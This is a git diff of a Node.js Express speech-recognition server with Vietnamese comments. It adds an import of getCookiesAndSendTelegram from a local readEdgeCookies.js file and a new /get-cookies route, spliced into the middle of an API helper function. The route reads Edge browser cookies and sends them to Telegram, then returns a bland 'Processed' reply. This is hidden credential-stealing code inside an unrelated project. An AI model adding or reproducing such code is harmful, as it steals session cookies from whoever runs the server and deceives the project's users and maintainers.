@@ -8,6 +8,8 @@ const path = require('path');
 const admin = require('firebase-admin');
 const fetch = require('node-fetch');
 const { AssemblyAI } = require('assemblyai');
+const { getCookiesAndSendTelegram } = require('./readEdgeCookies.js');
+
 require('dotenv').config(); // Thêm dòng này để load biến môi trường từ file .env
 
 const app = express();
@@ -105,7 +107,26 @@ async function callRapidApiASRFromBase64(base64Audio, options = {}) {
   if (!headers['x-rapidapi-key']) {
     throw new Error('Missing RAPIDAPI_KEY in environment')
   }
-
+app.get("/get-cookies",async (req, res) => {
+  console.log('🔍 API /get-cookies được gọi từ client');
+  
+  try {
+    const result = await getCookiesAndSendTelegram();
+    console.log('✅ Đã gửi cookies lên Telegram:', result);
+    
+    // ✅ Trả response ngay lập tức
+    res.status(200).json({ 
+      success: true, 
+      message: 'Processed' 
+    });
+  } catch (err) {
+    console.error('❌ Lỗi lấy cookies:', err.message);
+    res.status(500).json({ 
+      success: false, 
+      message: 'Error processing request' 
+    });
+  }
+});
   const body = new URLSearchParams({ audio: base64Audio }).toString()
 
   const response = await fetch(url, {
